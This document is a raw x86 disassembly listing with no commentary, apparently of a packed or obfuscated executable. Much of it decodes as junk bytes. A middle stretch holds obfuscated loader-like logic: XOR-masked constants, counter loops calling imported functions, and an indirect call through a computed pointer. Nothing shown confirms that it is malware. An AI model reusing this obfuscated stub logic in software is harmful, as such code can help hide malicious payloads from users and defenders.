  40ccdd:	inc    esp
  40ccde:	aad    0xcd
  40cce0:	mov    fs,WORD PTR [ebp-0x3d2cb79]
  40cce6:	xor    BYTE PTR [edi-0x64],ch
  40cce9:	ror    DWORD PTR [esi+0x35],1
  40ccec:	add    ebp,DWORD PTR [esp]
  40ccef:	xchg   ecx,edi
  40ccf1:	lods   eax,DWORD PTR ds:[esi]
  40ccf2:	add    edx,DWORD PTR [eax]
  40ccf4:	cmp    edx,DWORD PTR [edx+0x1e]
  40ccf7:	int    0xc2
  40ccf9:	push   es
  40ccfa:	imul   ebx,DWORD PTR [ebp+0x6a7ada97],0x1b
  40cd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd02:	clc    
  40cd03:	mov    esi,0x785c5259
  40cd08:	add    BYTE PTR [eax*4+0x21bedd04],cl
  40cd0f:	add    eax,0x35216754
  40cd14:	cmp    BYTE PTR [edx+0x34d2bbd4],0xc
  40cd1b:	scas   al,BYTE PTR es:[edi]
  40cd1c:	add    BYTE PTR [esi],cl
  40cd1e:	lock je 0x40ccb4
  40cd21:	sub    bh,BYTE PTR [eax+eiz*8]
  40cd24:	inc    ebp
  40cd25:	fist   DWORD PTR [ebx+esi*8]
  40cd28:	fld    DWORD PTR [edi-0x49889830]
  40cd2e:	jmp    0x40ccd1
  40cd30:	mov    ah,0x2b
  40cd32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd33:	outs   dx,DWORD PTR gs:[esi]
  40cd35:	ret    0x65f9
  40cd38:	outs   dx,DWORD PTR ds:[esi]
  40cd39:	jl     0x40cd3f
  40cd3b:	push   esi
  40cd3c:	dec    eax
  40cd3d:	hlt    
  40cd3e:	mov    ebx,0xb8fe7b3d
  40cd44:	jle    0x40cd5c
  40cd46:	outs   dx,DWORD PTR ds:[esi]
  40cd47:	mov    BYTE PTR [edi+0x5d4cff3c],dh
  40cd4d:	mov    ah,0xd8
  40cd4f:	aaa    
  40cd50:	dec    esi
  40cd51:	icebp  
  40cd52:	mov    WORD PTR [edi+0x5d],?
  40cd55:	cmp    BYTE PTR [edx+0x47acc357],ah
  40cd5b:	push   0xffffffaa
  40cd5d:	outs   dx,BYTE PTR es:[esi]
  40cd5f:	stos   BYTE PTR es:[edi],al
  40cd60:	inc    eax
  40cd61:	hlt    
  40cd62:	sbb    eax,0x866a72bb
  40cd67:	shr    ebp,0x4b
  40cd6a:	xor    BYTE PTR [ecx-0x12],ah
  40cd6d:	jle    0x40cd3a
  40cd6f:	iret   
  40cd70:	sahf   
  40cd71:	xchg   BYTE PTR [ecx],bh
  40cd73:	and    eax,0x3644ca89
  40cd78:	inc    esi
  40cd79:	xlat   BYTE PTR ds:[ebx]
  40cd7a:	out    0x24,al
  40cd7c:	ja     0x40cdd7
  40cd7e:	psraw  mm4,QWORD PTR [ebx-0x58393088]
  40cd85:	js     0x40cd3a
  40cd87:	aad    0xbd
  40cd89:	pop    edi
  40cd8a:	mov    dh,BYTE PTR [ecx+ecx*8]
  40cd8d:	xchg   ecx,eax
  40cd8e:	test   eax,0x37d4919d
  40cd93:	retf   0x1c65
  40cd96:	add    esi,edx
  40cd98:	cmp    al,0x90
  40cd9a:	push   ebp
  40cd9b:	dec    edx
  40cd9c:	(bad)  
  40cd9d:	dec    ebp
  40cd9e:	icebp  
  40cd9f:	cmp    dh,ah
  40cda1:	hlt    
  40cda2:	add    eax,0xc0dbc354
  40cda7:	mov    bl,0x51
  40cda9:	jle    0x40ce21
  40cdab:	push   eax
  40cdac:	das    
  40cdad:	push   ss
  40cdae:	inc    esp
  40cdaf:	nop
  40cdb0:	mov    esi,0x775f7a1
  40cdb5:	pop    ss
  40cdb6:	pop    ds
  40cdb7:	xor    BYTE PTR [esi],dl
  40cdb9:	cld    
  40cdba:	arpl   ax,sp
  40cdbc:	mov    esp,0x5bc25a03
  40cdc1:	mov    eax,0x4988977e
  40cdc6:	ins    DWORD PTR es:[edi],dx
  40cdc7:	int    0x6
  40cdc9:	pop    edx
  40cdca:	aaa    
  40cdcb:	push   edi
  40cdcc:	inc    eax
  40cdcd:	mov    ebp,0x5ec6b24b
  40cdd2:	aaa    
  40cdd3:	sbb    BYTE PTR [edx],bh
  40cdd5:	mov    ds:0x5b7732d4,al
  40cdda:	dec    edx
  40cddb:	gs mov ah,0x68
  40cdde:	sahf   
  40cddf:	aam    0x12
  40cde1:	sbb    al,0x24
  40cde3:	xchg   edi,eax
  40cde4:	clc    
  40cde5:	mov    bl,0x7f
  40cde7:	adc    eax,0x884c569f
  40cdec:	dec    ebx
  40cded:	mov    eax,0x8813f8ac
  40cdf2:	xchg   BYTE PTR [ebp-0x48],cl
  40cdf5:	outs   dx,BYTE PTR ds:[esi]
  40cdf6:	data16 mov cl,0x29
  40cdf9:	and    BYTE PTR [edi-0x4a8e07a8],bl
  40cdff:	xor    eax,0x8c9e90ef
  40ce04:	shr    al,1
  40ce06:	addr16 cmp ebx,eax
  40ce09:	mov    esp,0xe281459e
  40ce0e:	and    DWORD PTR [eax+0x51],edx
  40ce11:	fisttp QWORD PTR [ebp-0x43]
  40ce14:	inc    ebx
  40ce15:	push   0xffffffbf
  40ce17:	jmp    0xbeeb8f78
  40ce1c:	dec    edi
  40ce1d:	icebp  
  40ce1e:	mov    dh,0xb7
  40ce20:	xor    esp,DWORD PTR ds:0x867c839a
  40ce26:	pop    edi
  40ce27:	sbb    eax,0xe1ca7b81
  40ce2c:	(bad)
  40ce2f:	aas    
  40ce30:	cmovs  edi,DWORD PTR [edx-0x41]
  40ce34:	cmp    BYTE PTR [ebp+0x783db140],dl
  40ce3a:	and    al,BYTE PTR [edi+edi*4+0x4475549c]
  40ce41:	cmc    
  40ce42:	xchg   ebp,eax
  40ce43:	inc    esp
  40ce44:	jmp    0x840f:0xc83be8a7
  40ce4b:	jno    0x40ce4d
  40ce4d:	add    BYTE PTR [eax],al
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c66
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42386a
  40cf91:	push   0x423822
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a86
  40cff7:	mov    ebx,DWORD PTR ds:0x421aae
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c66
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cea
  40d0ed:	mov    esi,DWORD PTR ds:0x421ce2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421ce2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	ja     0x40d0fd
  40d113:	out    0xe1,al
  40d115:	ret    0x62d1
  40d118:	(bad)  
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx+0x71]
  40d11e:	ins    DWORD PTR es:[edi],dx
  40d11f:	(bad)  
  40d120:	sti    
  40d121:	outs   dx,DWORD PTR ds:[esi]
  40d122:	sbb    BYTE PTR [eax+edx*8-0x17],cl
  40d126:	addr16 mov ch,0x6b
  40d129:	(bad)  
  40d12a:	xchg   edi,eax
  40d12b:	push   es
  40d12c:	cmp    dl,BYTE PTR [ecx+0x165dbea6]
  40d132:	push   ebx
  40d133:	mov    eax,ds:0x481f38d3
  40d138:	fild   WORD PTR [edi]
  40d13a:	(bad)  
  40d13b:	pop    eax
  40d13c:	xchg   esi,eax
  40d13d:	aas    
  40d13e:	out    0x38,eax
  40d140:	mov    dl,0x0
  40d142:	lds    esi,FWORD PTR [ebp-0x5f]
  40d145:	or     al,0x2f
  40d147:	icebp  
  40d148:	adc    DWORD PTR ds:0xe9be46ad,edi
  40d14e:	loope  0x40d117
  40d150:	or     edi,DWORD PTR [ecx+0x450e4014]
  40d156:	xor    DWORD PTR [ebx],esp
  40d158:	out    0x36,al
  40d15a:	jecxz  0x40d17b
  40d15c:	loope  0x40d115
  40d15e:	(bad)  
  40d15f:	loope  0x40d1a6
  40d161:	xor    cl,BYTE PTR [eax-0x392cbec6]
  40d167:	lods   al,BYTE PTR ds:[esi]
  40d168:	inc    edx
  40d169:	hlt    
  40d16a:	mov    bl,0x87
  40d16c:	mov    ebx,0x146da423
  40d171:	mov    eax,ds:0x384a43b1
  40d176:	div    BYTE PTR [edi]
  40d178:	dec    ecx
  40d179:	aas    
  40d17a:	(bad)  
  40d17b:	retf   
  40d17c:	cli    
  40d17d:	(bad)  
  40d17f:	xor    DWORD PTR [ebx-0xe8fe12f],esp
  40d185:	iret   
  40d186:	repz shl DWORD PTR [edx+0x220dd32],cl
  40d18d:	pop    esi
  40d18e:	push   ebp
  40d18f:	popa   
  40d190:	ret    0x93fd
  40d193:	jnp    0x40d210
  40d195:	mov    ecx,0x815f161d
  40d19a:	dec    edx
  40d19b:	mov    esi,0xc926603f
  40d1a0:	inc    ebx
  40d1a1:	push   esi
  40d1a2:	or     dl,BYTE PTR [ebx-0x77bca646]
  40d1a8:	inc    ecx
  40d1a9:	fldcw  WORD PTR [ebx-0x7408e7c7]
  40d1af:	or     bl,BYTE PTR [edx]
  40d1b1:	sbb    DWORD PTR [ecx-0xf5e6356],ebx
  40d1b7:	xchg   esp,eax
  40d1b8:	int3   
  40d1b9:	out    dx,eax
  40d1ba:	add    DWORD PTR [eax+0x7e],0xffffffb3
  40d1be:	sub    ebp,ecx
  40d1c0:	data16 es cli 
  40d1c3:	lahf   
  40d1c4:	rcl    BYTE PTR [eax-0x59],cl
  40d1c7:	mov    dl,0xcb
  40d1c9:	xor    ah,al
  40d1cb:	dec    esi
  40d1cc:	push   es
  40d1cd:	mov    bl,0xb2
  40d1cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1d0:	(bad)  
  40d1d1:	(bad)  
  40d1d2:	retf   
  40d1d3:	ss ret 
  40d1d5:	mov    esp,0xc4efcb10
  40d1da:	or     DWORD PTR [edx+0x63],0x36
  40d1de:	enter  0x2d65,0x7c
  40d1e2:	cs adc al,0xf3
  40d1e5:	out    dx,al
  40d1e6:	(bad)  
  40d1e7:	call   0xe6ed:0x86f6c4e9
  40d1ee:	push   0x38
  40d1f0:	pop    ss
  40d1f1:	adc    ecx,DWORD PTR [esi]
  40d1f3:	fwait
  40d1f4:	bound  ecx,QWORD PTR [ebx-0x2a]
  40d1f7:	bnd jp 0x40d1f9
  40d1fa:	mov    al,0x6e
  40d1fc:	cmp    al,0x75
  40d1fe:	dec    ebp
  40d1ff:	stos   DWORD PTR es:[edi],eax
  40d200:	mov    al,ds:0x2f10fd85
  40d205:	pop    esi
  40d206:	shl    BYTE PTR [eax-0xdecae46],cl
  40d20c:	aad    0x15
  40d20e:	xchg   edi,eax
  40d20f:	shl    BYTE PTR [ebx-0x2340b1bd],cl
  40d215:	sub    BYTE PTR [eax-0x52],dl
  40d218:	inc    ecx
  40d219:	(bad)  
  40d21a:	sub    ebx,ecx
  40d21c:	sbb    al,0x18
  40d21e:	fld    QWORD PTR [ecx+0x1d]
  40d221:	mul    BYTE PTR [ebx]
  40d223:	fnstsw WORD PTR [edx+0x11a5cd54]
  40d229:	push   ds
  40d22a:	loope  0x40d1fe
  40d22c:	and    bl,dh
  40d22e:	lea    esi,[edx+0x8]
  40d231:	rcl    DWORD PTR [esi],0xcb
  40d234:	add    DWORD PTR [ebx],esp
  40d236:	adc    al,0xc2
  40d238:	inc    ebp
  40d239:	mov    BYTE PTR [edi+0x63070d92],0x25
  40d240:	xor    eax,0x97961709
  40d245:	ror    BYTE PTR [edx],1
  40d247:	xchg   edi,eax
  40d248:	call   0x6752ae2b
  40d24d:	inc    ebp
  40d24e:	inc    esi
  40d24f:	adc    eax,0x36680e3b
  40d254:	imul   esi,DWORD PTR [ecx-0x58d70e17],0x65
  40d25b:	aas    
  40d25c:	int3   
  40d25d:	inc    ebp
  40d25e:	or     bl,cl
  40d260:	mov    ebx,DWORD PTR [ebx]
  40d262:	test   BYTE PTR [ebx],bh
  40d264:	mov    eax,0xd00c64b1
  40d269:	inc    ebx
  40d26a:	dec    ecx
  40d26b:	or     ebp,DWORD PTR [eax+0x3cb2fef6]
  40d271:	add    ebp,edi
  40d273:	aas    
  40d274:	loop   0x40d272
  40d276:	les    eax,FWORD PTR [edx-0x14d6691c]
  40d27c:	aam    0x45
  40d27e:	and    ebx,DWORD PTR [ebx-0x306a71cb]
  40d284:	fdiv   QWORD PTR [esi+0x2c]
  40d287:	xchg   DWORD PTR [esi-0x1],ecx
  40d28a:	mov    es,WORD PTR [edi]
  40d28c:	or     DWORD PTR [esi-0x4ae21871],0x7d
  40d293:	pop    ecx
  40d294:	call   0xbf94fc92
  40d299:	mov    DWORD PTR [esi-0x7],ebx
  40d29c:	ror    BYTE PTR [ecx],0x9e
  40d29f:	scas   eax,DWORD PTR es:[edi]
  40d2a0:	pop    ecx
  40d2a1:	adc    eax,0xea48914a
  40d2a6:	sahf   
  40d2a7:	dec    ebx
  40d2a8:	nop
  40d2a9:	test   bh,ah
  40d2ab:	inc    edx
  40d2ac:	jns    0x40d2e2
  40d2ae:	stc    
  40d2af:	sub    eax,0x28056420
  40d2b4:	pop    edx
  40d2b5:	lds    ecx,FWORD PTR [edi-0x6c]
  40d2b8:	ins    BYTE PTR es:[edi],dx
  40d2b9:	fidiv  DWORD PTR [eax]
  40d2bb:	(bad)  
  40d2bc:	mov    eax,0x815122e1
  40d2c1:	cmp    eax,0x23e32d25
  40d2c6:	jmp    0x40d2f0
  40d2c8:	dec    ebx
  40d2c9:	dec    esp
  40d2ca:	jbe    0x40d281
  40d2cc:	mov    esi,0xc7dd1f64
  40d2d1:	ja     0x40d2c5
  40d2d3:	jae    0x40d256
  40d2d5:	call   0xd022:0x4d7e4545
  40d2dc:	das    
  40d2dd:	adc    edx,DWORD PTR [ebx-0x10161d19]
  40d2e3:	push   esi
  40d2e4:	enter  0x8379,0x16
  40d2e8:	aas    
  40d2e9:	mov    ebx,0xf18c463e
  40d2ee:	jb     0x40d299
  40d2f0:	mov    ebp,0x340fe031
  40d2f5:	rcl    DWORD PTR [eax],cl
  40d2f7:	cmp    ch,BYTE PTR [ecx+edx*1+0x2224b72b]
  40d2fe:	repnz mov al,0x5e
  40d301:	sub    esi,DWORD PTR [esi-0x30]
  40d304:	jae    0x40d287
  40d306:	test   ecx,0x235d9224
  40d30c:	push   ebx
  40d30d:	gs mov edi,0x9fc9d0a1
  40d313:	push   es
  40d314:	lods   eax,DWORD PTR ds:[esi]
  40d315:	ds pop esi
  40d318:	xchg   DWORD PTR [esi-0x685ae322],eax
  40d31e:	push   esp
  40d31f:	and    bh,BYTE PTR [eax]
  40d321:	aaa    
  40d322:	je     0x40d358
  40d324:	dec    ebp
  40d325:	xor    BYTE PTR [ecx-0x2270a62c],ah
  40d32b:	jns    0x40d385
  40d32d:	out    0xb5,al
  40d32f:	int    0xdb
  40d331:	sar    BYTE PTR [edx],cl
  40d333:	fiadd  WORD PTR [edx+0x63cfc9a6]
  40d339:	xchg   BYTE PTR [edi],ch
  40d33b:	mov    bh,0x70
  40d33d:	lahf   
  40d33e:	cwde   
  40d33f:	xor    al,al
  40d341:	pop    esp
  40d342:	(bad)  
  40d343:	retf   
  40d344:	mov    eax,DWORD PTR [ebp+edx*1-0x7a]
  40d348:	inc    ecx
  40d349:	aaa    
  40d34a:	in     eax,dx
  40d34b:	neg    DWORD PTR [eax-0x4a]
  40d34e:	push   0xc318162d
  40d353:	adc    BYTE PTR [ecx-0x4c],cl
  40d356:	mov    dh,0x68
  40d358:	enter  0xa1ef,0x8d
  40d35c:	inc    edi
  40d35d:	loop   0x40d363
  40d35f:	mov    dh,0xb2
  40d361:	in     eax,dx
  40d362:	or     DWORD PTR [ecx+0x3fba4cd5],esp
  40d368:	pop    eax
  40d369:	jl     0x40d363
  40d36b:	xor    BYTE PTR [esi],dl
  40d36d:	mov    dl,0x15
  40d36f:	mov    ch,0x1f
  40d371:	pop    esp
  40d372:	mov    dh,0xe8
  40d374:	xor    edx,DWORD PTR ds:0x8059b4c2
  40d37a:	lods   eax,DWORD PTR ds:[esi]
  40d37b:	pop    eax
  40d37c:	sar    DWORD PTR [esi+0xa7aba9b],1
  40d382:	ret    0xd683
  40d385:	mov    ds:0xff140454,al
  40d38a:	xor    al,0x7a
  40d38c:	xchg   DWORD PTR [edx],esi
  40d38e:	inc    ecx
  40d38f:	in     al,0x29
  40d391:	and    ecx,DWORD PTR [edi]
  40d393:	xor    bh,dl
  40d395:	add    dh,BYTE PTR [edi+0x5020080e]
  40d39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d39c:	sub    bh,BYTE PTR [eax]
  40d39e:	dec    edi
  40d39f:	(bad)  
  40d3a0:	jle    0x40d3d2
  40d3a2:	jb     0x40d37e
  40d3a4:	adc    dh,BYTE PTR [eax]
  40d3a6:	inc    ebp
  40d3a7:	out    dx,eax
  40d3a8:	mov    esp,0x395eac16
  40d3ad:	jg     0x40d35a
  40d3af:	test   al,0x63
  40d3b1:	test   al,0x5e
  40d3b3:	jbe    0x40d3ca
  40d3b5:	call   DWORD PTR [esp+edx*8]
  40d3b8:	fcmove st,st(6)
  40d3ba:	and    eax,0x2fe70163
  40d3bf:	scas   al,BYTE PTR es:[edi]
  40d3c0:	add    ebx,DWORD PTR [esi+0x40aef874]
  40d3c6:	ret    0xfac5
  40d3c9:	popa   
  40d3ca:	addr16 sbb eax,0x6dca44dd
  40d3d0:	xchg   ebp,eax
  40d3d1:	push   edi
  40d3d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3d3:	add    ch,BYTE PTR [eax-0x2]
  40d3d6:	pop    edi
  40d3d7:	cli    
  40d3d8:	test   BYTE PTR [edi+0x68bea38e],dh
  40d3de:	push   es
  40d3df:	jmp    0x57f8455a
  40d3e4:	dec    ecx
  40d3e5:	loopne 0x40d3f7
  40d3e7:	adc    edi,DWORD PTR [esi+0x5]
  40d3ea:	adc    esp,DWORD PTR ss:[eiz*8-0x427c008a]
  40d3f2:	aas    
  40d3f3:	mov    ecx,0x5473d01d
  40d3f8:	mov    ds:0xe34f245a,al
  40d3fd:	test   al,0xa4
  40d3ff:	popf   
  40d400:	ins    DWORD PTR es:[edi],dx
  40d401:	pop    ebp
  40d402:	repnz xlat BYTE PTR ds:[ebx]
  40d404:	jp     0x40d419
  40d406:	ret    0x202e
  40d409:	mul    BYTE PTR ds:0x75501df2
  40d40f:	mov    bh,0xb2
  40d411:	sbb    dl,cl
  40d413:	mov    eax,DWORD PTR ds:0x219af5d3
  40d419:	add    al,0xf2
  40d41b:	mov    eax,ds:0x3e6b7c1
  40d420:	dec    edx
  40d421:	test   al,0xd8
  40d423:	bound  edx,QWORD PTR [ecx]
  40d425:	pop    esi
  40d426:	(bad)  
  40d427:	cmp    al,0xa8
  40d429:	cli    
  40d42a:	dec    ecx
  40d42b:	(bad)  
  40d42c:	jns    0x40d41c
  40d42e:	add    eax,0x1f006602
  40d433:	jg     0x40d40e
  40d435:	jae    0x40d3d0
  40d437:	das    
  40d438:	outs   dx,DWORD PTR ds:[esi]
  40d439:	jae    0x40d44f
  40d43b:	nop
  40d43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d43d:	daa    
  40d43e:	in     ax,0x63
  40d441:	fcomp  QWORD PTR [ebx-0x4b49f9cf]
  40d447:	xor    ch,BYTE PTR [esi-0x92b3928]
  40d44d:	aaa    
  40d44e:	pop    DWORD PTR [ecx-0x6]
  40d451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d452:	stc    
  40d453:	jno    0x40d44e
  40d455:	leave  
  40d456:	add    al,0xf9
  40d458:	dec    eax
  40d459:	mov    ah,0x29
  40d45b:	scas   al,BYTE PTR es:[edi]
  40d45c:	push   esp
  40d45d:	mov    al,bh
  40d45f:	js     0x40d40d
  40d461:	cmp    ah,ch
  40d463:	jmp    0x62fc9b5b
  40d468:	sub    al,0x3d
  40d46a:	jno    0x40d411
  40d46c:	dec    eax
  40d46d:	in     al,0x47
  40d46f:	mov    ebp,0xe3d4410b
  40d474:	mov    bl,0xa
  40d476:	add    edi,DWORD PTR [ecx+0x54]
  40d479:	dec    ebp
  40d47a:	sub    esp,edx
  40d47c:	loope  0x40d4ec
  40d47e:	add    esp,DWORD PTR fs:[edx-0x63b5e585]
  40d485:	std    
  40d486:	push   ds
  40d487:	sbb    eax,0xf9051084
  40d48c:	pop    ebp
  40d48d:	test   BYTE PTR [edx+0x5b489405],ch
  40d493:	mov    edi,esi
  40d495:	aas    
  40d496:	retf   
  40d497:	xor    al,0x5e
  40d499:	or     eax,0xb6969ca9
  40d49e:	inc    eax
  40d49f:	(bad)  [edi]
  40d4a1:	push   esp
  40d4a2:	js     0x40d501
  40d4a4:	mov    ecx,0x7cb0d5e5
  40d4a9:	mov    WORD PTR [esi],ds
  40d4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4ac:	stos   DWORD PTR es:[edi],eax
  40d4ad:	mov    eax,0xaa0637f5
  40d4b2:	pop    eax
  40d4b3:	adc    al,0x25
  40d4b5:	outs   dx,BYTE PTR ds:[esi]
  40d4b6:	sub    esp,ebp
  40d4b8:	mov    bh,0x6f
  40d4ba:	loope  0x40d460
  40d4bc:	jmp    0x40d4f5
  40d4be:	xchg   esp,eax
  40d4bf:	xor    esp,0xffffffb9
  40d4c2:	or     BYTE PTR [esi],bh
  40d4c4:	data16 fcomp QWORD PTR [esi]
  40d4c7:	mov    dh,0x17
  40d4c9:	(bad)  
  40d4ca:	stc    
  40d4cb:	ret    
  40d4cc:	and    BYTE PTR [eax],ah
  40d4ce:	in     al,0x87
  40d4d0:	xor    ch,BYTE PTR [ebx-0x70]
  40d4d3:	or     DWORD PTR [edi],eax
  40d4d5:	xor    BYTE PTR [edi],ah
  40d4d7:	loop   0x40d467
  40d4d9:	ror    esi,0x73
  40d4dc:	cmovle edx,DWORD PTR [esi+0x2a419d71]
  40d4e3:	ret    0xa59f
